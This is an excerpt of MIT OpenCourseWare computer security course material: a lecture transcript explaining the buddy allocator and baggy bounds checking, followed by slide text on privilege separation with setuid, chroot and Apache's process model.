              <time_slice>1:13:23</time_slice>
              <text_slice>So what's going to happen is
that the buddy allocator will</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:26</time_slice>
              <text_slice>say, ah OK I actually
have a block here</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:29</time_slice>
              <text_slice>that's big enough, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:31</time_slice>
              <text_slice>50 Is greater than half
the size of this thing</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:33</time_slice>
              <text_slice>so I'll just allocate
that right there.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:35</time_slice>
              <text_slice>So we have this system, or
setup, where we have A here,</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:41</time_slice>
              <text_slice>and then we have
B here, and then</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:44</time_slice>
              <text_slice>let's say we had another request
that came in for 20 bytes.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:53</time_slice>
              <text_slice>This is actually
pretty straightforward</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:55</time_slice>
              <text_slice>because we can put
that right here, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:57</time_slice>
              <text_slice>So then you have something
that looks like this.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:03</time_slice>
              <text_slice>Then what's interesting is that
when you deallocate memory,</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:07</time_slice>
              <text_slice>if you have to
deallocate a block that</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:09</time_slice>
              <text_slice>are next to each other
and are the same size,</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:11</time_slice>
              <text_slice>the buddy allocator
will merge them</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:13</time_slice>
              <text_slice>into a block that's
twice as big, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:15</time_slice>
              <text_slice>So if we had free let's say C
then we go to this situation,</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:29</time_slice>
              <text_slice>we can't do any merging, because
this is the only possible block</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:33</time_slice>
              <text_slice>that this one could
have been merged with.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:35</time_slice>
              <text_slice>It's the same size, but
this things still occupied.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:37</time_slice>
              <text_slice>So then if we do a
free on A, then we</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:49</time_slice>
              <text_slice>have this situation here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:52</time_slice>
              <text_slice>Right, where these
two 32 byte blocks</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:56</time_slice>
              <text_slice>were merged into one size 64,
and that this one, a size 64</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:59</time_slice>
              <text_slice>is still out there.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:01</time_slice>
              <text_slice>Right, so it's called the buddy
system because once again,</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:03</time_slice>
              <text_slice>whenever you have two
adjacent blocks that</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:06</time_slice>
              <text_slice>are of the same
size and that could</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:08</time_slice>
              <text_slice>be merged to form
an aligned block,</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:11</time_slice>
              <text_slice>then the system will merge that
buddy with this other buddy</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:14</time_slice>
              <text_slice>and then create that new
block that's twice as big.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:18</time_slice>
              <text_slice>So the thing that's
nice about this system</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:20</time_slice>
              <text_slice>is that it's very simple to
figure out where buddy's are.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:26</time_slice>
              <text_slice>Because you can do
very cutesy arithmetic,</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:28</time_slice>
              <text_slice>like the buddy bounds system--
baggy bounds system works.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:31</time_slice>
              <text_slice>But anyway I'm not
going into details.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:32</time_slice>
              <text_slice>This is basically how
buddy allocation works.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:34</time_slice>
              <text_slice>Does that make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:37</time_slice>
              <text_slice>Right, and one
question that came up</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:39</time_slice>
              <text_slice>a lot in all my discussions,
isn't this wasteful?</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:43</time_slice>
              <text_slice>Right, so for example, imagine
that up here at the beginning</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:47</time_slice>
              <text_slice>I had a request for
size 65 bytes, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:52</time_slice>
              <text_slice>So if I have a
request for 65 bytes,</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:54</time_slice>
              <text_slice>I would allocate this whole
structure up here and then</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:57</time_slice>
              <text_slice>there's-- actually you're out of
dynamic memory and can't do any</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:00</time_slice>
              <text_slice>more allocations.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:00</time_slice>
              <text_slice>And the answer is
yes, that is wasteful.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:02</time_slice>
              <text_slice>But once again, it's
a trade off, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:04</time_slice>
              <text_slice>Because it's very easy to do
these calculations on how to do</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:07</time_slice>
              <text_slice>merging and stuff like that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:08</time_slice>
              <text_slice>So if you want finer
grain allocation,</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:10</time_slice>
              <text_slice>there are other
valid ones for that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:12</time_slice>
              <text_slice>It's outside the scope
of the lecture so,</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:13</time_slice>
              <text_slice>we can buffer that
offline if you want.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:15</time_slice>
              <text_slice>That's basically how the buddy--
sorry the, the buddy allocator</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:19</time_slice>
              <text_slice>works.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:21</time_slice>
              <text_slice>So what is the baggy
bounds system going to do?</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:26</time_slice>
              <text_slice>Well, it is going through
a y, on couple of tricks.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:41</time_slice>
              <text_slice>So the first idea is you
round up each allocation</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:52</time_slice>
              <text_slice>to a power of 2, and you align
the request to that power of 2.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:13</time_slice>
              <text_slice>Right, so essentially the
buddy allocators very nice</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:15</time_slice>
              <text_slice>because it handles a lot
of that for you, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:17</time_slice>
              <text_slice>It naturally will do
that kind of thing.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:18</time_slice>
              <text_slice>Because that's just the way that
it allocates and deallocates</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:21</time_slice>
              <text_slice>to memory.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:23</time_slice>
              <text_slice>And so the second thing
that's going to happen,</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:27</time_slice>
              <text_slice>baggy bounds system, is you
express each bound as log base</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:41</time_slice>
              <text_slice>2 of the allocation size.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:48</time_slice>
              <text_slice>Right, and so what this means--
and so why can we do this?</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:51</time_slice>
              <text_slice>Well once again all of
our allocation sizes</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:53</time_slice>
              <text_slice>are powers of 2, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:56</time_slice>
              <text_slice>So we don't need very
many bits to represent</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:59</time_slice>
              <text_slice>how big a particular
allocation size is.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:01</time_slice>
              <text_slice>So for example, if your
allocation size is 16,</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:10</time_slice>
              <text_slice>then you just need
four-- the log rhythm</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:14</time_slice>
              <text_slice>of that, 4 bits of the
allocation size, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:17</time_slice>
              <text_slice>Does that make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:19</time_slice>
              <text_slice>Right, this another
popular question here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:21</time_slice>
              <text_slice>This is why you only
need small number of bits</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:23</time_slice>
              <text_slice>here, because we're
basically forcing</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:25</time_slice>
              <text_slice>the allocation sizes hit this
quantized way that you grow.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:30</time_slice>
              <text_slice>Like if you could
only have something,</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:31</time_slice>
              <text_slice>let's say 16 bytes or 32 bytes.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:33</time_slice>
              <text_slice>You can't have for
example, 33 bytes.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:38</time_slice>
              <text_slice>And then the third thing that
baggy bounds is going to do</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:41</time_slice>
              <text_slice>is store the limit info in a
linear array 1 byte per entry</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:04</time_slice>
              <text_slice>but we're going
to allocate memory</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:12</time_slice>
              <text_slice>at the granularity of a slot.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:17</time_slice>
              <text_slice>Which in the paper they used
16 bytes as the slot width.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:24</time_slice>
              <text_slice>So for example,
now this next one,</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:26</time_slice>
              <text_slice>this is 1 bit that wasn't
actually specifically said</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:28</time_slice>
              <text_slice>in the paper which
if you don't grasp</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:31</time_slice>
              <text_slice>it'll make the paper very
tricky to understand, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:33</time_slice>
              <text_slice>So now you can have a slot
size which is equal to 16,</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:40</time_slice>
              <text_slice>so if you do p equals malloc
16 so what's going to happen?</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:48</time_slice>
              <text_slice>So in this bounds
table you're going</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:51</time_slice>
              <text_slice>to say take that pointer
plot it by plot size it's</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:02</time_slice>
              <text_slice>going to equal 4, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:04</time_slice>
              <text_slice>So in that bounds
table we're going</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:05</time_slice>
              <text_slice>to put the logarithm of the
allocation size in the table.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:11</time_slice>
              <text_slice>Does that make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:12</time_slice>
              <text_slice>OK, now what the
tricky thing is,</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:14</time_slice>
              <text_slice>let's say that you have
something like this.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:22</time_slice>
              <text_slice>Right, so let's say
that you out 32 bytes.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:26</time_slice>
              <text_slice>What is the bounds table
going to look like there?</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:29</time_slice>
              <text_slice>So here we actually have
to update the bounds</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:31</time_slice>
              <text_slice>table to abbreviate your p, or
sorry t for the size you need.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:37</time_slice>
              <text_slice>But that fit the
bounds table twice.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:44</time_slice>
              <text_slice>Right, once for the
first slot memory</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:47</time_slice>
              <text_slice>that this allocation takes up.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:49</time_slice>
              <text_slice>And then a second time for that
second slot that it takes up.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:00</time_slice>
              <text_slice>Right, so once again 32
is the allocation size.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:03</time_slice>
              <text_slice>This is the log of
that allocation size.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:06</time_slice>
              <text_slice>So for the two slots that
this memory takes up,</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:09</time_slice>
              <text_slice>we're going to update
the bounds table twice.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:11</time_slice>
              <text_slice>Does that makes sense?</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:13</time_slice>
              <text_slice>Right, and this
is really the key</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:15</time_slice>
              <text_slice>that I think for a
lot of people that's</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:16</time_slice>
              <text_slice>going to make the paper make
sense or not make sense, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:18</time_slice>
              <text_slice>Because that bounds table
multiple times if any</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:21</time_slice>
              <text_slice>outside the allocation.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:22</time_slice>
              <text_slice>AUDIENCE: Can you repeat
that for me again?</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:22</time_slice>
              <text_slice>PROFESSOR: Excuse me?</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:23</time_slice>
              <text_slice>AUDIENCE: Can you
repeat that again?</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:25</time_slice>
              <text_slice>PROFESSOR: Oh yeah,
yeah, sure, sure.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:26</time_slice>
              <text_slice>So basically what
the idea is that I</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:27</time_slice>
              <text_slice>mean you've got this
bounds table here</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:32</time_slice>
              <text_slice>and it's got a bunch of entries.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:34</time_slice>
              <text_slice>But it basically
needs entries to cover</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:38</time_slice>
              <text_slice>all of p size, all
the allocation size.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:41</time_slice>
              <text_slice>OK, so in this case it was very
simple because basically this</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:44</time_slice>
              <text_slice>is just one slot,
due to the size.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:46</time_slice>
              <text_slice>Here it's multiple
slot sizes, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:48</time_slice>
              <text_slice>So what's going to happen
is that imagine then</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:50</time_slice>
              <text_slice>that we had a pointer that's
moving in the range of p.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:53</time_slice>
              <text_slice>You have to have some
of the back end table</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:55</time_slice>
              <text_slice>slot for each one of those
places where p [INAUDIBLE],</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:58</time_slice>
              <text_slice>right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:59</time_slice>
              <text_slice>And so it's this
second piece that</text_slice>
            </slice>
            <slice>
              <time_slice>1:22:01</time_slice>
              <text_slice>makes the paper a little
bit confusing I think.</text_slice>
            </slice>
            <slice>
              <time_slice>1:22:03</time_slice>
              <text_slice>But it doesn't really go
into depth about that,</text_slice>
            </slice>
            <slice>
              <time_slice>1:22:06</time_slice>
              <text_slice>but this is how that works.</text_slice>
            </slice>
            <slice>
              <time_slice>1:22:10</time_slice>
              <text_slice>OK so armed with
the bounds table</text_slice>
            </slice>
            <slice>
              <time_slice>1:22:20</time_slice>
              <text_slice>stuff what happens if we have
a C code that looks like this?</text_slice>
            </slice>
            <slice>
              <time_slice>1:22:30</time_slice>
              <text_slice>So you have a pointer,
p-prime, you derive it from p,</text_slice>
            </slice>
            <slice>
              <time_slice>1:22:36</time_slice>
              <text_slice>we would add some variable i.</text_slice>
            </slice>
            <slice>
              <time_slice>1:22:40</time_slice>
              <text_slice>So how do you get the size of
the allocation belonging to p?</text_slice>
            </slice>
            <slice>
              <time_slice>1:22:47</time_slice>
              <text_slice>Well you look in the table
using this lookup here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:23:05</time_slice>
              <text_slice>Right, so the size of the data
that's been allocated to p</text_slice>
            </slice>
            <slice>
              <time_slice>1:23:09</time_slice>
              <text_slice>is going to be equal to
1 and then when you Left</text_slice>
            </slice>
            <slice>
              <time_slice>1:23:11</time_slice>
              <text_slice>Shift that by
looking at the table,</text_slice>
            </slice>
            <slice>
              <time_slice>1:23:14</time_slice>
              <text_slice>taking that pointer value,
and then Right Shifting that</text_slice>
            </slice>
            <slice>
              <time_slice>1:23:17</time_slice>
              <text_slice>by the log of the table size.</text_slice>
            </slice>
            <slice>
              <time_slice>1:23:19</time_slice>
              <text_slice>Right, if the
arithmetic works out</text_slice>
            </slice>
            <slice>
              <time_slice>1:23:21</time_slice>
              <text_slice>because of the way
that we're binding</text_slice>
            </slice>
            <slice>
              <time_slice>1:23:24</time_slice>
              <text_slice>pointers to the
table bounds, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:23:27</time_slice>
              <text_slice>So this will get us-- this
thing right here, will get us</text_slice>
            </slice>
            <slice>
              <time_slice>1:23:32</time_slice>
              <text_slice>the log of the sides.</text_slice>
            </slice>
            <slice>
              <time_slice>1:23:33</time_slice>
              <text_slice>And then this thing
over here basically</text_slice>
            </slice>
            <slice>
              <time_slice>1:23:36</time_slice>
              <text_slice>expands that into like
the regular value, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:23:39</time_slice>
              <text_slice>So for example, if the
size of this pointer</text_slice>
            </slice>
            <slice>
              <time_slice>1:23:42</time_slice>
              <text_slice>were 32, in terms of bytes
we've allocated, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:23:46</time_slice>
              <text_slice>This is going to get us five
when we look at the table,</text_slice>
            </slice>
            <slice>
              <time_slice>1:23:50</time_slice>
              <text_slice>then when we Left
Shift it this way, Left</text_slice>
            </slice>
            <slice>
              <time_slice>1:23:52</time_slice>
              <text_slice>Shift the one this
way, then we're</text_slice>
            </slice>
            <slice>
              <time_slice>1:23:54</time_slice>
              <text_slice>going to get 32 back
again from here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:23:57</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>1:23:58</time_slice>
              <text_slice>And then we want to find
the base of that pointer.</text_slice>
            </slice>
            <slice>
              <time_slice>1:24:06</time_slice>
              <text_slice>Take a pointer
itself and then we're</text_slice>
            </slice>
            <slice>
              <time_slice>1:24:14</time_slice>
              <text_slice>going to and that
with the side minus 1.</text_slice>
            </slice>
            <slice>
              <time_slice>1:24:24</time_slice>
              <text_slice>Now what this is going to
do is, this is actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:24:26</time_slice>
              <text_slice>going to give us a mass,
that you can think of it.</text_slice>
            </slice>
            <slice>
              <time_slice>1:24:29</time_slice>
              <text_slice>And that mass is going to allow
us to recover the base here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:24:34</time_slice>
              <text_slice>So imagine that
your size equals 16.</text_slice>
            </slice>
            <slice>
              <time_slice>1:24:40</time_slice>
              <text_slice>So 16 equals this in binary.</text_slice>
            </slice>
            <slice>
              <time_slice>1:24:49</time_slice>
              <text_slice>Right, there's a bunch
of zeros off this way.</text_slice>
            </slice>
            <slice>
              <time_slice>1:24:51</time_slice>
              <text_slice>So we've got a 1 here, we've
got some zeros over here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:24:55</time_slice>
              <text_slice>So if we look at the bit-wide
inverse of 16 minus 1,</text_slice>
            </slice>
            <slice>
              <time_slice>1:25:07</time_slice>
              <text_slice>then-- actually sorry.</text_slice>
            </slice>
            <slice>
              <time_slice>1:25:09</time_slice>
              <text_slice>So if we look at 16 minus 1, so
what's that going to look like?</text_slice>
            </slice>
            <slice>
              <time_slice>1:25:12</time_slice>
              <text_slice>60 minus 1 we're going to
look like right, something</text_slice>
            </slice>
            <slice>
              <time_slice>1:25:19</time_slice>
              <text_slice>like this.</text_slice>
            </slice>
            <slice>
              <time_slice>1:25:20</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>1:25:21</time_slice>
              <text_slice>And if we take the
inverse of that</text_slice>
            </slice>
            <slice>
              <time_slice>1:25:26</time_slice>
              <text_slice>what is that going to give us?</text_slice>
            </slice>
            <slice>
              <time_slice>1:25:32</time_slice>
              <text_slice>Right, in binary.</text_slice>
            </slice>
            <slice>
              <time_slice>1:25:33</time_slice>
              <text_slice>So basically this thing here
allows us to basically clear</text_slice>
            </slice>
            <slice>
              <time_slice>1:25:37</time_slice>
              <text_slice>the bit that essentially
would be offset</text_slice>
            </slice>
            <slice>
              <time_slice>1:25:40</time_slice>
              <text_slice>from that valid pointer
and just give us</text_slice>
            </slice>
            <slice>
              <time_slice>1:25:43</time_slice>
              <text_slice>the base of that pointer.</text_slice>
            </slice>
            <slice>
              <time_slice>1:25:44</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>1:25:46</time_slice>
              <text_slice>And so once we've
got this, then it's</text_slice>
            </slice>
            <slice>
              <time_slice>1:25:48</time_slice>
              <text_slice>very simple to check whether
this pointer's in bounds,</text_slice>
            </slice>
            <slice>
              <time_slice>1:25:50</time_slice>
              <text_slice>right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:25:51</time_slice>
              <text_slice>So we can basically just
check whether p-prime</text_slice>
            </slice>
            <slice>
              <time_slice>1:25:55</time_slice>
              <text_slice>is greater than or equal
to base and whether p-prime</text_slice>
            </slice>
            <slice>
              <time_slice>1:26:04</time_slice>
              <text_slice>minus the base is
less than size.</text_slice>
            </slice>
            <slice>
              <time_slice>1:26:13</time_slice>
              <text_slice>This is just a straightforward
thing you do, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:26:15</time_slice>
              <text_slice>Just seeing whether
that derived pointer</text_slice>
            </slice>
            <slice>
              <time_slice>1:26:17</time_slice>
              <text_slice>exists within the bounds
of this [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>1:26:19</time_slice>
              <text_slice>Right, so at this point things
are pretty straightforward.</text_slice>
            </slice>
            <slice>
              <time_slice>1:26:22</time_slice>
              <text_slice>Now they have like a
optimized check in the paper,</text_slice>
            </slice>
            <slice>
              <time_slice>1:26:24</time_slice>
              <text_slice>I'm not going to go
into that detail.</text_slice>
            </slice>
            <slice>
              <time_slice>1:26:25</time_slice>
              <text_slice>But suffice it to say that
all the binary arithmetic,</text_slice>
            </slice>
            <slice>
              <time_slice>1:26:27</time_slice>
              <text_slice>it resolves down
to the same thing.</text_slice>
            </slice>
            <slice>
              <time_slice>1:26:29</time_slice>
              <text_slice>There's just some
clever tricks there</text_slice>
            </slice>
            <slice>
              <time_slice>1:26:31</time_slice>
              <text_slice>to avoid some of the explicit
calculations we do here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:26:35</time_slice>
              <text_slice>That's the basic idea.</text_slice>
            </slice>
            <slice>
              <time_slice>1:26:36</time_slice>
              <text_slice>And so the fifth trick that
the baggy bounds system uses</text_slice>
            </slice>
            <slice>
              <time_slice>1:26:49</time_slice>
              <text_slice>is that it uses the virtual
memory system to prevent out</text_slice>
            </slice>
            <slice>
              <time_slice>1:26:59</time_slice>
              <text_slice>of bounds [INAUDIBLE] right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:27:04</time_slice>
              <text_slice>So the idea here is
that-- how much time</text_slice>
            </slice>
            <slice>
              <time_slice>1:27:07</time_slice>
              <text_slice>do we have by the way?</text_slice>
            </slice>
            <slice>
              <time_slice>1:27:08</time_slice>
              <text_slice>Probably like zero?</text_slice>
            </slice>
            <slice>
              <time_slice>1:27:09</time_slice>
              <text_slice>So the basic idea
here is that if we</text_slice>
            </slice>
            <slice>
              <time_slice>1:27:12</time_slice>
              <text_slice>have a pointer [INAUDIBLE]
here, that we detect</text_slice>
            </slice>
            <slice>
              <time_slice>1:27:15</time_slice>
              <text_slice>is out of bounds, what we can do
is actually set the high order</text_slice>
            </slice>
            <slice>
              <time_slice>1:27:19</time_slice>
              <text_slice>bit on a pointer, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:27:21</time_slice>
              <text_slice>And by doing that we guarantee
that pointer is dereferenced,</text_slice>
            </slice>
            <slice>
              <time_slice>1:27:26</time_slice>
              <text_slice>then the caging hardware's
going to be [INAUDIBLE],</text_slice>
            </slice>
            <slice>
              <time_slice>1:27:28</time_slice>
              <text_slice>we're going to throw
a hard error, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:27:30</time_slice>
              <text_slice>Now in and of
itself, just setting</text_slice>
            </slice>
            <slice>
              <time_slice>1:27:31</time_slice>
              <text_slice>that bit does not
cause a problem.</text_slice>
            </slice>
            <slice>
              <time_slice>1:27:33</time_slice>
              <text_slice>It's only when you
dereference that pointer</text_slice>
            </slice>
            <slice>
              <time_slice>1:27:35</time_slice>
              <text_slice>that you get into problems.</text_slice>
            </slice>
            <slice>
              <time_slice>1:27:37</time_slice>
              <text_slice>OK?</text_slice>
            </slice>
          </transcript>
        </video>
      </videos>
    </lecture>
    <lecture>
      <lecture_title>Privilege Separation (PDF)</lecture_title>
      <lecture_pdf_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/mit6_858f14_lec4/</lecture_pdf_url>
      <lectureno>4</lectureno>
      <slides>
        <slide>
          <slideno>2</slideno>
          <text>Finds	&#13; user's	&#13; UID	&#13; based	&#13; o n	&#13; /etc/passwd.
	 Finds	&#13; user's	&#13; groups	&#13; based	&#13; on /etc/group.
 Calls	&#13; setuid(), setgid(), setgroups()	&#13; before	&#13; running user's	&#13; shell
How do you regain p
rivileges	&#13; after	&#13; switching to	&#13; a non -root user?
	 Could	&#13; use	&#13; file	&#13; descriptor	&#13; passing (but have	&#13; to	&#13; write	&#13; specialized	&#13;  code)
	 Kernel mechanism: setuid/setgid binaries.
o	 When	&#13; the binary is executed,	&#13; set	&#13; process UID or GID to binary owner.
o	 Specified with a special bit
in the file's permissions.
o	 For example, su / sudo binaries are typically setuid root.
o	 Even if your shell	&#13; is
not	&#13; root,	&#13; can	&#13; run	&#13; "s u	&#13; otheruser"
o	 su process	&#13; will check passwd,	&#13; run	&#13; shell as	&#13; otheruser	&#13; if OK.
o	 Many such programs on Unix,
since root privileges often needed.
	 Why might setuid-binar
ies be a bad idea,	&#13; security -wise?
o Many ways
for adversary (caller of binary) to manipulate process.
o	 In Unix, exec'ed process
inherits environment vars, file descriptors, ..
o	 Libraries that a setuid program	&#13; might
use not sufficiently paranoid
o Historically, many vulnerabilities (e.g. pass $LD_PRELOAD, ..)
How to prevent a malicious
program	&#13; from	&#13; exploiting setuid-root binaries?
	 Kernel mechanism: chroot
o	 Changes what '/' means when opening files by path name.
o	 Cannot name files (e.g.
setuid binaries) outside chroot tree.
	 For example, OKWS uses chroot
to restrict programs to /var/okws/run, ..
	 Kernel also ensures that '/../' does not allow escape from	&#13; chroot.
	 Why chroot	&#13; only allowed for root?
o	 setuid	&#13; binaries	&#13; (like	&#13; su)	&#13; can	&#13; get confused	&#13; about what's	&#13; /etc/passwd.
o	 many kernel implementations (inadvertently?) allow
recursive calls to
chroot() to escape from	&#13; chroot jail,
so chroot is not an effective security	&#13; 
mechanism	&#13; for a process running as root.
	 Why hasn't	&#13; chroot	&#13; been	&#13; fixed to confine a root	&#13; process in	&#13; that	&#13; dir?
o Root can write kern mem, load kern modules, access disk sectors, ..
Background: traditional web server
architecture (Apache).
	 Apache runs N identical processes, handling HTTP requests.
	 All processes run as user 'www'.
	 Application code (e.g. PHP) typically runs inside each of N apache processes.
	 Any accesses to OS state (files, processes, ...) performed by www's UID.
	 Storage:	&#13; SQL database, typically one connection with full access to DB.
o	 Database	&#13; principal is the	&#13; entire	&#13; application.
	 Problem: if any component is
compromised, adversary gets all the data.
	 What kind of attacks might occur in a web application?
o	 Unintended	&#13; data	&#13; disclosure	&#13; (getting	&#13; page source code, hidden files,	&#13; ..)
o	 Remote code execution (e.g., buffer
overflow in Apache)
o	 Buggy application	&#13; code (hard to write secure PHP	&#13; code),	&#13; e.g.	&#13; SQL inj.
o Attacks on web browsers (cross-site scripting	&#13; attacks)
3</text>
        </slide>
        <slide>
          <slideno>7</slideno>
          <text>MIT OpenCourseWare
http://ocw.mit.edu
6.858 Computer Systems Security
Fall 2014
For information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms.</text>
        </slide>
